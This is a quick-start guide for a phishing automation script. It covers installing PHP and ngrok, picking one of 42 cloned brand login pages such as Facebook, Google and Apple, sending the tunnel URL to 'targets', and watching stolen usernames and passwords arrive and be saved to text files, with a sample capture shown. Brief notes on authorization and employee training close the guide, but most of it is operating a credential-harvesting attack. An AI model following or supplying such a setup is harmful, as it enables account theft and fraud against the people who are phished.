# Quick Start Guide

## Installation (First Time Setup)

1. **Install dependencies**:
```bash
sudo apt-get update
sudo apt-get install php curl jq -y
```

2. **Install ngrok**:
```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

3. **Setup ngrok authentication**:
   - Go to: https://dashboard.ngrok.com/get-started/your-authtoken
   - Copy your auth token
   - Run: `ngrok authtoken YOUR_TOKEN_HERE`

4. **Make script executable**:
```bash
chmod +x phishing-tool.sh
```

## Running the Tool

```bash
./phishing-tool.sh
```

## What Happens

1. You'll see a menu with 42 phishing sites
2. Select a site by entering its number
3. The tool will:
   - Start PHP server on port 8080
   - Create ngrok tunnel
   - Show you the phishing URL
4. Share the ngrok URL with targets
5. Watch credentials appear in real-time!

## Stopping

Press **Ctrl+C** to stop. It will show you:
- Total credentials captured
- Where they're saved

## Captured Data Location

```
sites/[SITE-NAME]/usernames.txt
```

## Example Run

```
$ ./phishing-tool.sh

╔═══════════════════════════════════════════════════════════╗
║        PHISHING AUTOMATION TOOL                          ║
║        For Educational Purpose Only                      ║
╚═══════════════════════════════════════════════════════════╝

[*] Checking dependencies...
[✓] All dependencies are installed

Available Phishing Sites:

[1] Adobe
[2] Amazon
[3] Apple
[4] Facebook
[5] Google
...

Enter the number of the site you want to use:
> 4

[✓] Selected: facebook

[*] Starting PHP server on port 8080...
[✓] PHP server started (PID: 12345)

[*] Starting ngrok tunnel...
[✓] ngrok tunnel created

╔═══════════════════════════════════════════════════════════╗
║  Phishing URL:                                          ║
║  https://abc123.ngrok.io
╚═══════════════════════════════════════════════════════════╝

[*] Monitoring for captured credentials...
[*] Press Ctrl+C to stop

════════════════════════════════════════════════════════════
[!] NEW CREDENTIALS CAPTURED!
────────────────────────────────────────────────────────────
Facebook Username: test@example.com Pass: password123
────────────────────────────────────────────────────────────
Total captures: 1
════════════════════════════════════════════════════════════
```

## Troubleshooting

| Problem | Solution |
|---------|----------|
| "PHP is not installed" | Run: `sudo apt-get install php` |
| "ngrok is not installed" | Follow ngrok installation steps above |
| "Failed to get ngrok URL" | Check ngrok authentication |
| Port already in use | Change `PHP_PORT` in script |

## Important Notes

⚠️ **Legal Requirements**:
- Get written authorization first
- Only use for employee training
- Document all activities
- Delete captured data after training

✅ **Best Practice**:
- Notify IT/Security team before running
- Conduct follow-up training for affected employees
- Never use on unauthorized targets

---

For detailed information, see [README.md](README.md)
